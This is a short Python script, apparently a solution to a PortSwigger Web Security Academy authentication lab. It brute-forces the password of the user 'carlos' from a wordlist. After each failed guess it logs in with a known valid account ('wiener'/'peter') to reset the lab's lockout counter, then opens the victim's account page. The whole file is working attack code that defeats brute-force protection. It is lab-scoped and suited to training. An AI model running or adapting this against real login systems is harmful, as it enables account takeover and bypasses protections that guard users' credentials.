import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac241f111fc6e479c050c8460027002c.web-security-academy.net'
username = 'carlos'

#Given the site name, use python to construct the login page 
#using f-string will serve as a template to directly include values of variables
login_url = f'''https://{site}/login'''

lines = open('auth-lab-usernames', "r").readlines()

def login():
    logindata = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    resp = s.post(login_url, data=logindata)

#Goes through the password list undtil there is no more is-warning class
pass_lines = open('auth-lab-passwords', "r").readlines()
for password in pass_lines:
    target_p = password.strip()
    print(f'Testing case: {target_p}')
    logindata = {
        'username' : username,
        'password' : target_p
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('p', {'class':'is-warning'}):
        login()
        continue
    else:
        print(f'password is {target_p}')
        break

#goes to link to complete CTF
s.get(f'https://{site}/my-account?id={username}')